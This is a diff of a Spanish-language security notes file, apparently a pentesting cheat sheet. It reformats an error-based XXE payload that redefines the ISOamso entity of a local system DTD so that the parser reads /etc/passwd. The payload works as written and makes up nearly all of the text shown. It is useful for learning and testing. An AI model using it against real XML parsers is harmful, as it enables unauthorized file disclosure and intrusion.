@@ -199,7 +199,14 @@ Ejemplo:
 - Explotando una XXE abusando de los archivos DTD del sistema, en el archivo llama a ISOamso, usaremos esa variable para explotar la XXE creando un xml personalizado que realice la funcion de llamar al archivo de /etc/passwd que es el objetivo. 
 
 ```xml
-<!DOCTYPE foo [<!ENTITY % el_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
-<!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
-<!ENTITY &#x25; variable "<!ENTITY &#x26;#x25; errormensaje SYSTEM &#x27;file:///estonoexiste/&#x25;file;&#x27;>">&#x25;variable; &#x25;errormensaje;'>%el_dtd;]>
+<!DOCTYPE foo [
+<!ENTITY % el_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+  <!ENTITY &#x25; variable "
+      <!ENTITY &#x26;#x25; errormensaje SYSTEM &#x27;file:///estonoexiste/&#x25;file;&#x27;>
+  ">
+  &#x25;variable;
+  &#x25;errormensaje;
+'>%el_dtd;]>
 ```
